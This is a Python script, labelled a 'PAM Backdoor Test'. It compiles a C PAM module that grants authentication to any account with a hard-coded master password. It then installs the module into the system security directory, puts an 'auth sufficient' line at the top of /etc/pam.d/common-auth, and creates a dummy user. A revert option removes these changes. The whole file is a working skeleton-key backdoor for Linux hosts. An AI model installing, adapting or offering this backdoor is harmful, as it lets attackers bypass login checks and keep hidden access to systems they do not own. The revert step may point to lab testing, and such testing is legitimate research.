import os
import subprocess
import sys
import argparse

MASTER_PASS = "1234"
MODULE_NAME = "pam_skeleton"
SOURCE_FILE = f"{MODULE_NAME}.c"
SO_FILE = f"{MODULE_NAME}.so"
DUMMY_USER = "testuser"

SEC_DIR = "/lib/x86_64-linux-gnu/security" if os.path.exists("/lib/x86_64-linux-gnu") else "/lib/security"
PAM_CONF = "/etc/pam.d/common-auth"

C_CODE = f"""
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdlib.h>

#define MASTER_PASSWORD "{MASTER_PASS}"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
    const char *password;
    int retval;
    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (retval != PAM_SUCCESS || password == NULL) return PAM_AUTH_ERR;
    if (strcmp(password, MASTER_PASSWORD) == 0) return PAM_SUCCESS;
    return PAM_IGNORE;
}}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
    return PAM_SUCCESS;
}}
"""

def install():
    if os.getuid() != 0:
        print("[-] error: elevated shell required.")
        sys.exit(1)

    with open(SOURCE_FILE, "w") as f:
        f.write(C_CODE)

    print("[*] compiling pam module...")
    cmd = f"gcc -fPIC -shared -o {SO_FILE} {SOURCE_FILE} -lpam"
    if subprocess.run(cmd, shell=True).returncode != 0:
        print("[-] compilation failed.")
        return

    dest = os.path.join(SEC_DIR, SO_FILE)
    subprocess.run(f"cp {SO_FILE} {dest}", shell=True)

    with open(PAM_CONF, "r") as f:
        lines = f.readlines()

    if not any(SO_FILE in line for line in lines):
        payload = f"auth sufficient {SO_FILE}\n"
        lines.insert(0, payload)
        subprocess.run(f"cp {PAM_CONF} {PAM_CONF}.bak", shell=True)
        with open(PAM_CONF, "w") as f:
            f.writelines(lines)
        print("[+] injection successful.")

    print(f"[*] creating dummy user: {DUMMY_USER}...")
    subprocess.run(f"useradd -m {DUMMY_USER} -p $(openssl passwd -1 password123)", shell=True, stderr=subprocess.DEVNULL)
    print(f"\n[DONE] skeleton key '{MASTER_PASS}' active. test with 'su {DUMMY_USER}'.")

def revert():
    if os.getuid() != 0:
        print("[-] error: elevated shell required.")
        sys.exit(1)

    print(f"[*] removing entry from {PAM_CONF}...")
    if os.path.exists(PAM_CONF):
        with open(PAM_CONF, "r") as f:
            lines = f.readlines()
        
        new_lines = [l for l in lines if SO_FILE not in l]
        
        with open(PAM_CONF, "w") as f:
            f.writelines(new_lines)

    print("[*] deleting compiled module and source...")
    dest = os.path.join(SEC_DIR, SO_FILE)
    for f_path in [dest, SO_FILE, SOURCE_FILE]:
        if os.path.exists(f_path):
            os.remove(f_path)
            print(f"  [-] deleted {f_path}")

    print(f"[*] deleting dummy user {DUMMY_USER}...")
    subprocess.run(f"userdel -r {DUMMY_USER}", shell=True, stderr=subprocess.DEVNULL)

    print("\n[+] complete. system restored to original state.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PAM Backdoor Test")
    parser.add_argument("--install", action="store_true", help="install the backdoor")
    parser.add_argument("--revert", action="store_true", help="remove the backdoor and clean up")
    
    args = parser.parse_args()

    if args.install:
        install()
    elif args.revert:
        revert()
    else:
        parser.print_help()
